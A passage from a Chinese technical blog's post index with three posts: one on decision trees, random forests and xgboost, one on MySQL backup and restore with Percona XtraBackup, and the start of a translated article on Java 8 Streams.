什么是最大熵熵是随机变量不确定性的度量，不确定性越大，熵值越大；若随机变量退化成定值，熵为0。如果没有外界干扰，随机变量总是趋向于无序，在经过足够时间的稳定演化，它应该能够达到的最大程度的熵。 为了准确的估计随机变量的状态，我们一般习惯性最大化熵，认为在所有可能的概率模型（分布）的集合中，熵最大的模型是最好的模型(泛化能力最好)。换言之，在已知部分知识的前提下，关于未知分布最合理的推断就是符合已知知识最不确定或最随机的推断，其原则是承认已知事物（知识），且对未知事物不做任何假设，没有任何偏见。 例如，投掷一个骰子，如果问”每个面朝上的概率分别是多少”，你会说是等概率，即各点出现的概率均为1/6。因为对这个”一无所知”的色子，什么都不确定，而假定它每一个朝上概率均等则是最合理的做法。从投资的角度来看，这是风险最小的做法，而从信息论的角度讲，就是保留了最大的不确定性，也就是说让熵达到最大。 什么是决策树决策树(Decision Tree)是在已知各种情况发生概率的基础上，通过构建决策树来进行分析的一种方式，是一种直观应用概率分析的一种图解法；决策树是一种预测模型，代表的是对象属性与对象值之间的映射关系；决策树是一种树形结构，其中每个内部节点表示一个属性的测试，每个分支表示一个测试输出，每个叶节点代表一种类别；决策树是一种非常常用的有监督的分类算法。 决策树的决策过程就是从根节点开始，测试待分类项中对应的特征属性，并按照其值选择输出分支，直到叶子节点，将叶子节点的存放的类别作为决策结果。 决策树分为两大类：分类树和回归树，前者用于分类标签值，后者用于预测连续值，常用算法有ID3、C4.5、CART等 决策树构建过程顾名思义，决策树就是用一棵树来表示我们的整个决策过程。这棵树可以是二叉树（比如 CART 只能是二叉树），也可以是多叉树（比如 ID3、C4.5 可以是多叉树或二叉树）。 根节点包含整个样本集，每个叶节都对应一个决策结果（注意，不同的叶节点可能对应同一个决策结果），每一个内部节点都对应一次决策过程或者说是一次属性测试。从根节点到每个叶节点的路径对应一个判定测试序列。 决策树的构造关键步骤就是分裂属性。分裂属性是指在某个节点按照某一类特征属性的不同划分构建不同的分支，其目标就是让各个分裂子集尽可能的”纯”(让一个分裂子类中待分类的项尽可能的属于同一个类别)。 构建步骤：1）开始，所有记录看做一个节点2）遍历每个节点的每一种分割方式，找到最好的分割点3）将数据分割为两个节点部分N1和N24）对N1和N2分别继续执行2-3步，直到每个节点中的项足够”纯” 特征属性类型：根据特征属性的类型不同，在构建决策树的时候，采用不同的方式，具体如下：1）属性是离散值，而且不要求生成的是二叉决策树，此时一个属性就是一个分支2）属性是离散值，而且要求生成的是二叉决策树，此时使用属性划分的子集进行测试，按照“属于此子集”和“不属于此子集”分成两个分支3）属性是连续值，可以确定一个值作为分裂点split_point，按照&gt;split_point和&lt;=split_point生成两个分支 构建停止条件：决策树构建的过程是一个递归的过程，所以必须给定停止条件，常用有两种：1）当每个子节点只有一种类型的时候停止构建2）当前节点中记录数小于某个阈值，同时迭代次数达到给定值时，停止构建，并使用max(p(i))作为节点对应类型。方式一可能会使树的节点过多，导致过拟合(Overfiting)等问题；比较常用的方式是使用方式二作为停止条件 决策树算法是一种贪心算法策略，只考虑在当前数据特征情况下的最好分割方式，不能进行回溯操作。 决策树的纯度子集越纯，子集中待分类的项就越可能属于同一个类别。 决策树的构建是基于样本概率和纯度进行构建操作的，那么进行判断数据集是否”纯”可以通过三个公式进行判断，分别是Gini系数、熵(Entropy)、错误率，这三个公式值越大，表示数据越”不纯”；越小表示越”纯”；实践证明这三种公式效果差不多，一般情况使用熵公式。 根据熵公式计算出各个特征属性的量化纯度值后，使用 信息增益度 来选择出当前数据集的分割特征属性；如果信息增益度的值越大，表示在该特征属性上会损失纯度越大，就越应该在决策树的上层。计算公式为：Gain为A为特征对训练数据集D的信息增益，它为集合D的经验熵H(D)与特征A给定条件下D的经验条件熵H(D/A)之差. ID3、C4.5、CART介绍 这三个是非常著名的决策树算法。简单粗暴来说，ID3 使用 信息增益 作为选择特征的准则；C4.5 使用 信息增益率 作为选择特征的准则；CART 使用 Gini 系数 作为选择特征的准则。 1、ID3ID3内部使用信息熵以及信息增益来进行构建；每次迭代选择信息增益最大的特征属性作为分割属性。 熵表示的是数据中包含的信息量大小。熵越小，数据的纯度越高，也就是说数据越趋于一致，这是我们希望的划分之后每个子节点的样子。 信息增益 = 划分前熵 - 划分后熵。信息增益越大，则意味着使用属性 a 来进行划分所获得的 “纯度提升” 越大 **。也就是说，用属性 a 来划分训练集，得到的结果中纯度比较高。 ID3 仅仅适用于二分类问题。ID3 仅仅能够处理离散属性。 优点:决策树构建速度快；实现简单； 缺点： 计算依赖于特征数目较多的特征，而属性值最多的属性并不一定最优 ID3算法不是递增算法 ID3算法是单变量决策树，对于特征属性之间的关系不会考虑 抗噪性差 只适合小规模数据集，需要将数据放到内存中 2、C4.5C4.5 基于ID3算法提出；它克服了 ID3 仅仅能够处理离散属性的问题，以及信息增益偏向选择取值较多特征的问题，使用信息增益比来选择特征。信息增益比 = 信息增益 / 划分前熵 选择信息增益比最大的作为最优特征。 C4.5 在树的构造过程中会进行剪枝操作进行优化，也能够自动完成对连续属性的离散化处理；C4.5 处理连续特征是先将特征取值排序，以连续两个值中间值作为划分标准。尝试每一种划分，并计算修正后的信息增益，选择信息增益最大的分裂点作为该属性的分裂点。 优点： 产生的规则易于理解 准确率较高 实现简单 缺点： 对数据集需要进行多次顺序扫描和排序，所以效率较低 只适合小规模数据集，需要将数据放到内存中 ID3算法和C4.5算法总结1）ID3和C4.5算法均只适合在小规模数据集上使用2）ID3和C4.5算法都是单变量决策树3）当属性值取值比较多的时候，最好考虑C4.5算法，ID3得出的效果会比较差4）决策树分类一般情况只适合小数据量的情况(数据可以放内存) 3、CARTCART(Classification And Regression Tree，分类回归树) 的全称是分类与回归树。从这个名字中就应该知道，CART 既可以用于分类问题，也可以用于回归问题。 CART 与 ID3，C4.5 不同之处在于 CART 生成的树必须是二叉树。也就是说，无论是回归还是分类问题，无论特征是离散的还是连续的，无论属性取值有多个还是两个，内部节点只能根据属性值进行二分。 回归树中，使用平方误差最小化准则来选择特征并进行划分。每一个叶子节点给出的预测值，是划分到该叶子节点的所有样本目标值的均值，这样只是在给定划分的情况下最小化了平方误差。 要确定最优化分，还需要遍历所有属性，以及其所有的取值来分别尝试划分并计算在此种划分情况下的最小平方误差，选取最小的作为此次划分的依据。由于回归树生成使用平方误差最小化准则，所以又叫做最小二乘回归树。 分类树种，使用 Gini 指数最小化准则来选择特征并进行划分； Gini 指数表示集合的不确定性，或者是不纯度。基尼指数越大，集合不确定性越高，不纯度也越大。这一点和熵类似。另一种理解基尼指数的思路是，基尼指数是为了最小化误分类的概率。 4、信息增益 vs 信息增益比之所以引入了信息增益比，是由于信息增益的一个缺点。那就是：信息增益总是偏向于选择取值较多的属性。信息增益比在此基础上增加了一个罚项，解决了这个问题。 5、Gini 指数 vs 熵既然这两个都可以表示数据的不确定性，不纯度。那么这两个有什么区别那？ Gini 指数的计算不需要对数运算，更加高效； Gini 指数更偏向于连续属性，熵更偏向于离散属性。 剪枝决策树算法很容易过拟合（overfitting），剪枝算法就是用来防止决策树过拟合，提高泛华性能的方法。 剪枝分为预剪枝与后剪枝。 预剪枝是指在决策树的生成过程中，对每个节点在划分前先进行评估，若当前的划分不能带来泛化性能的提升，则停止划分，并将当前节点标记为叶节点。 后剪枝是指先从训练集生成一颗完整的决策树，然后自底向上对非叶节点进行考察，若将该节点对应的子树替换为叶节点，能带来泛化性能的提升，则将该子树替换为叶节点。 那么怎么来判断是否带来泛化性能的提升那？最简单的就是留出法，即预留一部分数据作为验证集来进行性能评估。 决策树优化策略 剪枝优化决策树过度拟合一般情况是由于节点太多导致的，剪枝优化对决策树的正确率影响比较大。 K-Fold Cross Validation(K交叉验证)首先计算出整体的决策树T，叶子点个数为N，记i属于[1,N]。对每个i，使用K交叉验证方法计算决策树，并使决策树的叶子节点数量为i个(剪枝)，计算错误率，得出平均错误率；使用最小错误率的i作为最优决策树的叶子点数量，并对原始决策树T进行裁剪。 Random Forest利用训练数据随机产生多个决策树，形成一个森林。然后使用这个森林对数据进行预测，选取最多结果作为预测结果。 决策树总结决策树算法主要包括三个部分：特征选择、树的生成、树的剪枝。常用算法有 ID3、C4.5、CART。 特征选择。特征选择的目的是选取能够对训练集分类的特征。特征选择的关键是准则：信息增益、信息增益比、Gini 指数； 决策树的生成。通常是利用信息增益最大、信息增益比最大、Gini 指数最小作为特征选择的准则。从根节点开始，递归的生成决策树。相当于是不断选取局部最优特征，或将训练集分割为基本能够正确分类的子集； 决策树的剪枝。决策树的剪枝是为了防止树的过拟合，增强其泛化能力。包括预剪枝和后剪枝。 随机森林如何处理缺失值方法一（na.roughfix）简单粗暴，对于训练集，同一个class下的数据，如果是分类变量缺失，用众数补上，如果是连续型变量缺失，用中位数补。 方法二（rfImpute）这个方法计算量大，至于比方法一好坏不好判断。先用na.roughfix补上缺失值，然后构建森林并计算proximity matrix，再回头看缺失值，如果是分类变量，则用没有缺失的观测实例的proximity中的权重进行投票。如果是连续型变量，则用proximity矩阵进行加权平均的方法补缺失值。然后迭代4-6次，这个补缺失值的思想和KNN有些类似12。 随机森林如何评估特征重要性衡量变量重要性的方法有两种，Decrease GINI 和 Decrease Accuracy：1) Decrease GINI： 对于回归问题，直接使用argmax(VarVarLeftVarRight)作为评判标准，即当前节点训练集的方差Var减去左节点的方差VarLeft和右节点的方差VarRight。2) Decrease Accuracy：对于一棵树Tb(x)，我们用OOB样本可以得到测试误差1；然后随机改变OOB样本的第j列：保持其他列不变，对第j列进行随机的上下置换，得到误差2。至此，我们可以用误差1-误差2来刻画变量j的重要性。基本思想就是，如果一个变量j足够重要，那么改变它会极大的增加测试误差；反之，如果改变它测试误差没有增大，则说明该变量不是那么的重要。 为什么xgboost要用泰勒展开，优势在哪里xgboost使用了一阶和二阶偏导， 二阶导数有利于梯度下降的更快更准. 使用泰勒展开取得函数做自变量的二阶导数形式， 可以在不选定损失函数具体形式的情况下， 仅仅依靠输入数据的值就可以进行叶子分裂优化计算， 本质上也就把损失函数的选取和模型算法优化/参数选择分开了. 这种去耦合增加了xgboost的适用性， 使得它按需选取损失函数， 可以用于分类， 也可以用于回归。 xgboost如何寻找最优特征，是有放回还是无放回xgboost在训练的过程中给出各个特征的增益评分，最大增益的特征会被选出来作为分裂依据， 从而记忆了每个特征对在模型训练时的重要性 — 从根到叶子中间节点涉及某特征的次数作为该特征重要性排序.xgboost属于boosting集成学习方法， 样本是不放回的， 因而每轮计算样本不重复. 另一方面， xgboost支持子采样， 也就是每轮计算可以不使用全部样本， 以减少过拟合. 进一步地， xgboost 还有列采样， 每轮计算按百分比随机采样一部分特征， 既提高计算速度又减少过拟合。","link":"/2017/10/21/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%86%B3%E7%AD%96%E6%A0%91%E3%80%81%E9%9A%8F%E6%9C%BA%E6%A3%AE%E6%9E%97%E5%92%8C%E6%8F%90%E5%8D%87%E7%AE%97%E6%B3%95/"},{"title":"通过Percona Xtrabackup实现数据的备份与恢复","text":"Xtrabackup简介Percona XtraBackup是一个开源、免费的MySQL热备份软件,能够为InnoDB和XtraDB数据库执行非阻塞备份，特点如下： 1、快速、可靠的完成备份2、备份期间不间断事务处理3、节省磁盘空间和网络带宽4、自动对备份文件进行验证5、恢复快，保障在线运行时间持久性 另外，官网关于Xtrabackup还有如下介绍，它能增量备份MySQL数据库，通过流压缩备份MySQL数据到另外一台服务器，在线MySQL服务器之间进行表空间迁移，很easy的创建新的MySQL从服务器，并且备份MySQL数据库时不会带来额外的系统压力。 XtraBackup 有两个工具：xtrabackup 和 innobackupex：xtrabackup 本身只能备份 InnoDB 和 XtraDB ，不能备份 MyISAM；innobackupex 本身是 Hot Backup 脚本修改而来，同时可以备份 MyISAM 和 InnoDB，但是备份 MyISAM 需要加读锁。 为什么说Xtrabackup是针对InnoDB引擎的备份工具？对于MyISAM表只能是温备，而且也不支持增量备份。而XtraBackup更多高级特性通常只能在innodb存储引擎上实现，而且高级特性还都依赖于mysql数据库对innodb引擎实现了单独表空间，否则没办法实现单表或单库导出，因此可以说Xtrabackup是为InnoDB而生也不为过！ 官网软件下载：https://www.percona.com/downloads/XtraBackup/LATEST/用户操作手册：http://www.percona.com/doc/percona-xtrabackup/2.4/index.html Xtrabackup备份原理1、InnoDB的备份原理在InnoDB内部会维护一个redo日志文件，我们也可以叫做事务日志文件。事务日志会存储每一个InnoDB表数据的记录修改。当InnoDB启动时，InnoDB会检查数据文件和事务日志，并执行两个步骤：它应用（前滚）已经提交的事务日志到数据文件，并将修改过但没有提交的数据进行回滚操作。 备份过程Xtrabackup在启动时会记住log sequence number（LSN），并且复制所有的数据文件。复制过程需要一些时间，所以这期间如果数据文件有改动，那么将会使数据库处于一个不同的时间点。这时，xtrabackup会运行一个后台进程，用于监视事务日志，并从事务日志复制最新的修改。Xtrabackup必须持续的做这个操作，是因为事务日志是会轮转重复的写入，并且事务日志可以被重用。所以xtrabackup自启动开始，就不停的将事务日志中每个数据文件的修改都记录下来。 准备过程上面就是xtrabackup的备份过程。接下来是准备（prepare）过程。在这个过程中，xtrabackup使用之前复制的事务日志，对各个数据文件执行灾难恢复（就像mysql刚启动时要做的一样）。当这个过程结束后，数据库就可以做恢复还原了。 2、MyISAM的备份原理以上的过程在xtrabackup的编译二进制程序中实现。程序innobackupex可以允许我们备份MyISAM表和frm文件从而增加了便捷和功能。Innobackupex会启动xtrabackup，直到xtrabackup复制数据文件后，然后执行FLUSH TABLES WITH READ LOCK来阻止新的写入进来并把MyISAM表数据刷到硬盘上，之后复制MyISAM数据文件，最后释放锁。 备份MyISAM和InnoDB表最终会处于一致，在准备（prepare）过程结束后，InnoDB表数据已经前滚到整个备份结束的点，而不是回滚到xtrabackup刚开始时的点。这个时间点与执行FLUSH TABLES WITH READ LOCK的时间点相同，所以myisam表数据与InnoDB表数据是同步的。类似oracle的，InnoDB的prepare过程可以称为recover（恢复），myisam的数据复制过程可以称为restore（还原）。 Xtrabackup和innobackupex这两个工具都提供了许多前文没有提到的功能特点。手册上有对各个功能都有详细的介绍。简单介绍下，这些工具提供了如流（streaming）备份，增量（incremental）备份等，通过复制数据文件，复制日志文件和提交日志到数据文件（前滚）实现了各种复合备份方式。 什么是流备份？流备份是指备份的数据通过标准输出STDOUT传输给tar程序进行归档，而不是单纯的将数据文件保存到指定的备份目录中，参数—stream=tar表示开启流备份功能并打包。同时也可以利用流备份到远程服务器上。 Xtrabackup实现细节XtraBackup以read-write模式打开innodb的数据文件，然后对其进行复制。其实它不会修改此文件。也就是说，运行 XtraBackup的用户，必须对innodb的数据文件具有读写权限。之所以采用read-write模式是因为XtraBackup采用了其内置的 innodb库来打开文件，而innodb库打开文件的时候就是rw的。 XtraBackup要从文件系统中复制大量的数据，所以它尽可能地使用posix_fadvise()，来告诉OS不要缓存读取到的数据，从 而提升性能。因为这些数据不会重用到了，OS却没有这么聪明。如果要缓存一下的话，几个G的数据，会对OS的虚拟内存造成很大的压力，其它进程，比如 mysqld很有可能被swap出去，这样系统就会受到很大影响了。 在备份innodb page的过程中，XtraBackup每次读写1MB的数据，1MB/16KB=64个page。这个不可配置。读1MB数据之 后，XtraBackup一页一页地遍历这1MB数据，使用innodb的buf_page_is_corrupted()函数检查此页的数据是否正常，如果数据不正常，就重新读取这一页，最多重新读取10次，如果还是失败，备份就失败了，退出。在复制transactions log的时候，每次读写512KB的数据。同样不可以配置。 Xtrabackup安装与卸载在官网中，复制相关链接下载最新版本https://www.percona.com/downloads/XtraBackup/LATEST/ 1234567# 安装cd /data/install_packageswget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.5/binary/redhat/6/x86_64/percona-xtrabackup-24-2.4.5-1.el6.x86_64.rpmyum install percona-xtrabackup-24-2.4.5-1.el6.x86_64.rpm# 如果提示缺失依赖包# yum -y install perl perl-devel libaio libaio-devel perl-Time-HiRes perl-DBD-MySQL 123456# 如果版本错误，查看已安装的percona版本yum list installed |grep perconapercona-xtrabackup-24.x86_64 2.4.5-1.el6 @/percona-xtrabackup-24-2.4.5-1.el6.x86_64# 卸载yum remove percona-xtrabackup-24.x86_64 Xtrabackup常用参数1234567891011121314151617常用参数：--user=USER 指定备份用户，不指定的话为当前系统用户--password=PASSWD 指定备份用户密码--port=PORT 指定数据库端口--defaults-group=GROUP-NAME 在多实例的时候使用--host=HOST 指定备份的主机，可以为远程数据库服务器--apply-log 回滚日志--database 指定需要备份的数据库，多个数据库之间以空格分开--defaults-file 指定mysql的配置文件--copy-back 将备份数据复制回原始位置--incremental 增量备份，后面跟要增量备份的路径--incremental-basedir=DIRECTORY 增量备份时使用指向上一次的增量备份所在的目录--incremental-dir=DIRECTORY 增量备份还原的时候用来合并增量备份到全量，用来指定全备路径--redo-only 对增量备份进行合并--rsync 加快本地文件传输，适用于non-InnoDB数据库引擎。不与--stream共用--safe-slave-backup--no-timestamp 生成的备份文件不以时间戳为目录. 完全备份与恢复完全备份目录：/data/backup/full完全备份与增量备份每次命令操作成功的标志是，日志结尾处打印【completed OK!】 12345678910111213141516171819# 全量备份innobackupex --user=root --password=passwd /data/backup/full# 上个命令在我的 /data/backup/full/ 目录生成了一个文件夹【2017-01-20_10-52-43】# 一般情况下，这个备份不能用于恢复，因为备份的数据中可能会包含尚未提交的事务或已经提交但尚未同步至数据文件中的事务，此时数据文件处于不一致的状态# 因此，我们现在就是要通过回滚未提交的事务及同步已经提交的事务至数据文件也使得数据文件处于一致性状态。innobackupex --user=root --password --defaults-file=/data/mysql/my.cnf --apply-log /data/backup/full/2017-01-20_10-52-43# 恢复操作演练# 关掉服务，迁移已有的数据目录service mysql stopmv /data/mysql/data /data/mysql/data_oldmkdir -p /data/mysql/data# 执行innobackupex恢复命令innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --copy-back /data/backup/full/2017-01-20_10-52-43# 对新目录执行赋权操作，此操作需在innobackupex恢复命令后chown -R mysql.mysql /data/mysql/data# 重启服务，并检查数据是否恢复service mysqld start增量备份与恢复增量备份目录1：/data/backup/inc1增量备份目录2：/data/backup/inc2 123456789101112131415161718192021222324# 全量备份innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd /data/backup/full# 第一次增量备份innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --incremental /data/backup/inc1 --incremental-basedir=/data/backup/full/2017-01-20_10-52-43# --incremental-basedir指的是完全备份所在的目录# 此命令执行结束后，innobackupex命令会在/data/backup目录中创建一个新的以时间命名的目录以存放所有的增量备份数据。# 另外，在执行过增量备份之后再一次进行增量备份时，其--incremental-basedir应该指向上一次的增量备份所在的目录。# 需要注意的是，增量备份仅能应用于InnoDB或XtraDB表，对于MyISAM表而言，执行增量备份时其实进行的是完全备份。# 第二次增量备份innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --incremental /data/backup/inc2 --incremental-basedir=/data/backup/inc1/2017-01-20_11-04-31# 如果需要恢复的话需要先执行如下操作innobackupex --apply-log --redo-only /data/backup/full/2017-01-20_10-52-43innobackupex --apply-log --redo-only /data/backup/full/2017-01-20_10-52-43 --incremental-dir=/data/backup/inc1/2017-01-20_11-04-31# 如果存在多次增量备份的话，就多次执行如下命令。此处执行针对的是第二次增量备份innobackupex --apply-log --redo-only /data/backup/full/2017-01-20_10-52-43 --incremental-dir=/data/backup/inc2/2017-01-20_11-06-41# 恢复操作演练，需先停掉服务器并迁移已有的数据目录，详情见全量备份# 执行恢复命令innobackupex --defaults-file=/data/mysql/my.cnf --user=root --password=passwd --copy-back /data/backup/full/2017-01-20_10-52-43 备份恢复常见错误Q：针对增量备份已经执行了增量恢复，再次执行相关恢复命令时，报如下错误1234567xtrabackup: ########################################################xtrabackup: # !!WARNING!! #xtrabackup: # The transaction log file is corrupted. #xtrabackup: # The log was not applied to the intended LSN! #xtrabackup: ########################################################xtrabackup: The intended lsn is 1614986xtrabackup: starting shutdown with innodb_fast_shutdown = 1A：此错误是提示你日志已损坏，即上次的恢复命令已经对日志进行了回滚。所以每次对增量备份执行恢复时，可事先备份数据，以防万一。 Q：对备份文件执行恢复命令时，报错如下：12innobackupex: Connecting to MySQL server with DSN 'dbi:mysql:;mysql_read_default_group=xtrabackup' as 'root' (using password: YES).innobackupex: Error: Failed to connect to MySQL server: DBI connect(';mysql_read_default_group=xtrabackup','root',...) failed: Can't connect to local MySQL server through socket '/var/lib/mysql/mysql.sock' (2) at /usr/bin/innobackupex line 2995A： 说明没有读取到my.cnf中的socket路径，也说明备份连接数据库时候走的是socket接口形式，我们可以换做走tcp/ip，执行命令中新增参数—host=127.0.0.1即可。如果仍然报错，检查相关命令是否有拼错的单词，检查datadir目录是否有【mysql:mysql】权限等。 Q：xtrabackup Error: datadir must be specified.A：—defaults-file 对应的 my.cnf 文件没有指明datadir目录。如果指明了目录，执行相关命令仍然报错。把命令中的 —defaults-file 顺序从 —password后移至innobackupex后试试。innobackupex查找datadir不够智能。 备份方案的选择常见的备份有全量备份、增量备份和差异备份。 首先需要弄明白增量备份和差异备份的区别:增量备份：自从任意类型的上次备份后有所修改做的备份。差异备份：自上次全备份后有所改变的部分而做的备份。 全量备份与差异备份结合以每周数据备份计划为例，我们可以在周一进行完全备份，在周二至周日进行差异备份。如果在周日数据被破坏了，则你只需要还原周一的全量备份和周六的差异备份。这种策略备份数据需要时间较多，但还原数据使用时间较少。 全量备份与增量备份结合以每周数据备份计划为例，我们可以在周一进行完全备份，在周二至周日进行增量备份。如果在周日数据被破坏了，则你需要还原周一的全量备份和从周二至周六的所有增量备份。这种策略备份数据需要时间较少，但还原数据使用时间较多。且周二至周六任何一个增量数据损坏，所有备份不可用。 全量备份、增量备份和差异备份结合以每周数据备份计划为例，我们可以在周一进行完全备份，在周二至周日进行差异备份，并且每天针对当天的差异备份每隔一段时间（比如半小时）进行增量备份。如果在周日某个时间点数据被破坏了，则你需要还原周一的全量备份和周六的差异备份，然后再还原周日所做的所有增量备份。这种策略操作最复杂，但是数据库最多损失半个小时的数据。 PS： 只做备份，不做恢复演练，可能最后一场空。 &lt;/br&gt;","link":"/2017/01/20/%E9%80%9A%E8%BF%87Percona%20Xtrabackup%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E7%9A%84%E5%A4%87%E4%BB%BD%E4%B8%8E%E6%81%A2%E5%A4%8D/"},{"title":"Lambda类库篇 —— Streams API, Collector和并行","text":"本文是深入理解Java 8 Lambda系列的第二篇，主要介绍Java 8针对新增语言特性而新增的类库（例如Streams API、Collectors和并行）。 本文是对 Brian Goetz 的 State of the Lambda: Libraries Edition 一文的翻译。 关于Java SE 8增加了新的语言特性（例如lambda表达式和默认方法），为此Java SE 8的类库也进行了很多改进，本文简要介绍了这些改进。在阅读本文前，你应该先阅读深入浅出Java 8 Lambda（语言篇），以便对Java SE 8的新增特性有一个全面了解。 背景（Background）自从lambda表达式成为Java语言的一部分之后，Java集合（Collections）API就面临着大幅变化。而JSR 355（规定了Java lambda表达式的标准）的正式启用更是使得Java集合API变的过时不堪。尽管我们可以从头实现一个新的集合框架（比如“Collection II”），但取代现有的集合框架是一项非常艰难的工作，因为集合接口渗透了Java生态系统的每个角落，将它们一一换成新类库需要相当长的时间。因此，我们决定采取演化的策略（而非推倒重来）以改进集合API： 为现有的接口（例如Collection，List和Stream）增加扩展方法； 在类库中增加新的流（stream，即java.util.stream.Stream）抽象以便进行聚集（aggregation）操作； 改造现有的类型使之可以提供流视图（stream view）； 改造现有的类型使之可以容易的使用新的编程模式，这样用户就不必抛弃使用以久的类库，例如ArrayList和HashMap（当然这并不是说集合API会常驻永存，毕竟集合API在设计之初并没有考虑到lambda表达式。我们可能会在未来的JDK中添加一个更现代的集合类库）。 除了上面的改进，还有一项重要工作就是提供更加易用的并行（Parallelism）库。尽管Java平台已经对并行和并发提供了强有力的支持，然而开发者在实际工作（将串行代码并行化）中仍然会碰到很多问题。因此，我们希望Java类库能够既便于编写串行代码也便于编写并行代码，因此我们把编程的重点从具体执行细节（how computation should be formed）转移到抽象执行步骤（what computation should be perfomed）。除此之外，我们还需要在将并行变的容易（easier）和将并行变的不可见（invisible）之间做出抉择，我们选择了一个折中的路线：提供显式（explicit）但非侵入（unobstrusive）的并行。（如果把并行变的透明，那么很可能会引入不确定性（nondeterminism）以及各种数据竞争（data race）问题） Java 8之前，Google的Guava工程已对JDK的集合做了很大扩展，感兴趣的可以访问 Google Guava官方教程（中文版） 内部迭代和外部迭代（Internal vs external iteration）集合类库主要依赖于外部迭代（external iteration）。Collection实现Iterable接口，从而使得用户可以依次遍历集合的元素。比如我们需要把一个集合中的形状都设置成红色，那么可以这么写：123for (Shape shape : shapes) { shape.setColor(RED);}这个例子演示了外部迭代：for-each循环调用shapes的iterator()方法进行依次遍历。外部循环的代码非常直接，但它有如下问题： Java的for循环是串行的，而且必须按照集合中元素的顺序进行依次处理； 集合框架无法对控制流进行优化，例如通过排序、并行、短路（short-circuiting）求值以及惰性求值改善性能。 尽管有时for-each循环的这些特性（串行，依次）是我们所期待的，但它对改善性能造成了阻碍。 我们可以使用内部迭代（internal iteration）替代外部迭代，用户把对迭代的控制权交给类库，并向类库传递迭代时所需执行的代码。 下面是前例的内部迭代代码：1shapes.forEach(s -&gt; s.setColor(RED)); 尽管看起来只是一个小小的语法改动，但是它们的实际差别非常巨大。用户把对操作的控制权交还给类库，从而允许类库进行各种各样的优化（例如乱序执行、惰性求值和并行等等）。总的来说，内部迭代使得外部迭代中不可能实现的优化成为可能。 外部迭代同时承担了做什么（把形状设为红色）和怎么做（得到Iterator实例然后依次遍历）两项职责，而内部迭代只负责做什么，而把怎么做留给类库。通过这样的职责转变：用户的代码会变得更加清晰，而类库则可以进行各种优化，从而使所有用户都从中受益。 流（Stream）流是Java SE 8类库中新增的关键抽象，它被定义于java.util.stream（这个包里有若干流类型：Stream代表对象引用流，此外还有一系列特化（specialization）流，比如IntStream代表整形数字流）。每个流代表一个值序列，流提供一系列常用的聚集操作，使得我们可以便捷的在它上面进行各种运算。集合类库也提供了便捷的方式使我们可以以操作流的方式使用集合、数组以及其它数据结构。 流的操作可以被组合成流水线（Pipeline）。以前面的例子为例，如果我们只想把蓝色改成红色：123shapes.stream() .filter(s -&gt; s.getColor() == BLUE) .forEach(s -&gt; s.setColor(RED)); 在Collection上调用stream()会生成该集合元素的流视图（stream view），接下来filter()操作会产生只包含蓝色形状的流，最后，这些蓝色形状会被forEach操作设为红色。 如果我们想把蓝色的形状提取到新的List里，则可以：123List&lt;Shape&gt; blue = shapes.stream() .filter(s -&gt; s.getColor() == BLUE) .collect(Collectors.toList()); collect()操作会把其接收的元素聚集（aggregate）到一起（这里是List），collect()方法的参数则被用来指定如何进行聚集操作。在这里我们使用toList()以把元素输出到List中。（如需更多collect()方法的细节，请阅读Collectors一节） 如果每个形状都被保存在Box里，然后我们想知道哪个盒子至少包含一个蓝色形状，我们可以这么写：1234Set&lt;Box&gt; hasBlueShape = shapes.stream() .filter(s -&gt; s.getColor() == BLUE) .map(s -&gt; s.getContainingBox()) .collect(Collectors.toSet()); map()操作通过映射函数（这里的映射函数接收一个形状，然后返回包含它的盒子）对输入流里面的元素进行依次转换，然后产生新流。 如果我们需要得到蓝色物体的总重量，我们可以这样表达：1234int sum = shapes.stream() .filter(s -&gt; s.getColor() == BLUE) .mapToInt(s -&gt; s.getWeight()) .sum(); 这些例子演示了流框架的设计，以及如何使用流框架解决实际问题。 流和集合（Streams vs Collections）集合和流尽管在表面上看起来很相似，但它们的设计目标是不同的：集合主要用来对其元素进行有效（effective）的管理和访问（access），而流并不支持对其元素进行直接操作或直接访问，而只支持通过声明式操作在其上进行运算然后得到结果。除此之外，流和集合还有一些其它不同： 无存储：流并不存储值；流的元素源自数据源（可能是某个数据结构、生成函数或I/O通道等等），通过一系列计算步骤得到； 天然的函数式风格（Functional in nature）：对流的操作会产生一个结果，但流的数据源不会被修改； 惰性求值：多数流操作（包括过滤、映射、排序以及去重）都可以以惰性方式实现。这使得我们可以用一遍遍历完成整个流水线操作，并可以用短路操作提供更高效的实现； 无需上界（Bounds optional）：不少问题都可以被表达为无限流（infinite stream）：用户不停地读取流直到满意的结果出现为止（比如说，枚举完美数这个操作可以被表达为在所有整数上进行过滤）。集合是有限的，但流不是（操作无限流时我们必需使用短路操作，以确保操作可以在有限时间内完成）； 从API的角度来看，流和集合完全互相独立，不过我们可以既把集合作为流的数据源（Collection拥有stream()和parallelStream()方法），也可以通过流产生一个集合（使用前例的collect()方法）。Collection以外的类型也可以作为stream的数据源，比如JDK中的BufferedReader、Random和BitSet已经被改造可以用做流的数据源，Arrays.stream()则产生给定数组的流视图。事实上，任何可以用Iterator描述的对象都可以成为流的数据源，如果有额外的信息（比如大小、是否有序等特性），库还可以进行进一步的优化。 惰性（Laziness）过滤和映射这样的操作既可以被急性求值（以filter为例，急性求值需要在方法返回前完成对所有元素的过滤），也可以被惰性求值（用Stream代表过滤结果，当且仅当需要时才进行过滤操作）在实际中进行惰性运算可以带来很多好处。比如说，如果我们进行惰性过滤，我们就可以把过滤和流水线里的其它操作混合在一起，从而不需要对数据进行多遍遍历。相类似的，如果我们在一个大型集合里搜索第一个满足某个条件的元素，我们可以在找到后直接停止，而不是继续处理整个集合。（这一点对无限数据源是很重要，惰性求值对于有限数据源起到的是优化作用，但对无限数据源起到的是决定作用，没有惰性求值，对无限数据源的操作将无法终止） 对于过滤和映射这样的操作，我们很自然的会把它当成是惰性求值操作，不过它们是否真的是惰性取决于它们的具体实现。另外，像sum()这样生成值的操作和forEach()这样产生副作用的操作都是“天然急性求值”，因为它们必须要产生具体的结果。 以下面的流水线为例：1234int sum = shapes.stream() .filter(s -&gt; s.getColor() == BLUE) .mapToInt(s -&gt; s.getWeight()) .sum(); 